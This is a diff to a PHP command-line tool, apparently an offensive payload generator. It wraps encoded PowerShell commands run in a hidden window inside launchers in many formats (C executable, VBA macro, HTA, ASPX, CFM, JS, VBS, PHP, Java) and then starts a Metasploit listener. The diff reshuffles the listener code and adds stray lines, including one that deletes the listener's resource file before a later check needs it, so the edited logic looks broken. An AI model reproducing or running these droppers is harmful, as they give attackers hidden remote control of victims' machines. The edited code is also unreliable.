@@ -1,6 +1,9 @@
 #!/usr/bin/php
 <?php
 system("clear");
+system("rm meta.rc");
+$exif = exif_read_data('/root/Desktop/azaz.jpeg');
+print_r($exif);
 $a=array("          
 
           %---------------
@@ -149,6 +152,7 @@ function generate_shell(){
 		fwrite($mf, $c);
 		fwrite($mf, $d);
 		fclose($mf);
+	}else{
 	}
 	
 	echo "\n\e[91mGenerating Payload\e[0m . . .\n";
@@ -230,12 +234,6 @@ End Sub'."\n";
 
 echo "\e[96m".$vba."\e[0m\n";
 
-	if(file_exists("meta.rc")){
-		system("msfconsole -r meta.rc");
-		system("rm meta.rc");
-	}else{
-		echo "\e[101m\e[97mHappy Hack :)!\e[0m\n";
-	}
 
 }
 ###########################EXE ENCODE#############################
@@ -261,7 +259,7 @@ int main()
     system("powershell -nop -win Hidden -noni -enc '.$powershell_encoded.'");
     return 0;
 }';
-
+echo $exe;
 $ef = fopen("c_file_temp.c", "w") or die("Unable to open file!");
 fwrite($ef, $exe);
 fclose($ef); 
@@ -276,12 +274,6 @@ system("rm c_file_temp.c");
 echo "kitty.exe created!\n\n";
 echo "\e[101m\e[97mHappy Hack :)!\e[0m\n";
 
-if(file_exists("meta.rc")){
-		system("msfconsole -r meta.rc");
-		system("rm meta.rc");
-	}else{
-		die();
-	}
 }
 ###########################JAVA ENCODE#############################
 elseif($lencode == "java"){
@@ -309,12 +301,6 @@ Process s;
 echo $java;
 echo "\e[101m\e[97mHappy Hack :)!\e[0m\n";
 
-if(file_exists("meta.rc")){
-		system("msfconsole -r meta.rc");
-		system("rm meta.rc");
-	}else{
-		die();
-	}
 }
 ############################JS ENCODE#############################
 elseif($lencode =="js"){
@@ -327,12 +313,6 @@ objShell.run("powershell -nop -win Hidden -noni -enc '.$powershell_encoded.'", 0
 echo $js;
 echo "\e[101m\e[97mHappy Hack :)!\e[0m\n";
 
-if(file_exists("meta.rc")){
-		system("msfconsole -r meta.rc");
-		system("rm meta.rc");
-	}else{
-		die();
-	}
 }
 ###########################PHP ENCODE#############################
 elseif($lencode =="php"){
@@ -346,12 +326,6 @@ system("cmd.exe /c powershell -nop -win Hidden -noni -enc'.$powershell_encoded.'
 echo $php;
 echo "\e[101m\e[97mHappy Hack :)!\e[0m\n";
 
-if(file_exists("meta.rc")){
-		system("msfconsole -r meta.rc");
-		system("rm meta.rc");
-	}else{
-		die();
-	}
 }
 ###########################HTA ENCODE#############################
 elseif($lencode =="hta"){
@@ -370,16 +344,9 @@ $hta = '<html>
 </body> 
 </html>'."\n";
 
-
 echo $hta;
 echo "\e[101m\e[97mHappy Hack :)!\e[0m\n";
 
-if(file_exists("meta.rc")){
-		system("msfconsole -r meta.rc");
-		system("rm meta.rc");
-	}else{
-		die();
-	}
 }
 ###########################CFM ENCODE#############################
 elseif($lencode == "cfm"){
@@ -394,12 +361,6 @@ $cfm = '<cfexecute name = "C:\\Windows\\System32\\cmd.exe"
 echo $cfm;
 echo "\e[101m\e[97mHappy Hack :)!\e[0m\n";
 
-if(file_exists("meta.rc")){
-		system("msfconsole -r meta.rc");
-		system("rm meta.rc");
-	}else{
-		die();
-	}
 }
 ###########################ASPX ENCODE#############################
 elseif($lencode =="aspx"){
@@ -421,12 +382,7 @@ $aspx = '
 echo $aspx;
 echo "\e[101m\e[97mHappy Hack :)!\e[0m\n";
 
-if(file_exists("meta.rc")){
-		system("msfconsole -r meta.rc");
-		system("rm meta.rc");
-	}else{
-		die();
-	}
+
 }
 ###########################CMD ENCODE#############################
 elseif($lencode =="cmd"){
@@ -435,12 +391,6 @@ elseif($lencode =="cmd"){
     echo "powershell -nop -win Hidden -noni -enc ".$powershell_encoded;
 	echo "\n\e[101m\e[97mHappy Hack :)!\e[0m\n";
 
-if(file_exists("meta.rc")){
-		system("msfconsole -r meta.rc");
-		system("rm meta.rc");
-	}else{
-		die();
-	}
 }
 ###########################RAW ENCODE#############################
 elseif($lencode == "raw"){
@@ -449,12 +399,6 @@ $powershell_encoded = generate_shell();
     echo $powershell_encoded;
 	echo "\n\e[101m\e[97mHappy Hack :)!\e[0m\n";
 
-if(file_exists("meta.rc")){
-		system("msfconsole -r meta.rc");
-		system("rm meta.rc");
-	}else{
-		die();
-	}
 }
 ######################VBS_ENCODE###############################
 elseif($lencode =="vbs"){
@@ -467,13 +411,13 @@ objShell.Run "powershell -nop -win Hidden -noni -enc '.$powershell_encoded.'", 0
 echo $vbs;
 echo "\n\e[101m\e[97mHappy Hack :)!\e[0m\n";
 
-if(file_exists("meta.rc")){
-		system("msfconsole -r meta.rc");
-		system("rm meta.rc");
-	}else{
-		die();
-	}
 }else{
 	die("Unknown Format!\n");
 }
+if(file_exists("meta.rc")){
+		system("msfconsole -r meta.rc");
+	}else{
+		die();
+	}
 }
+
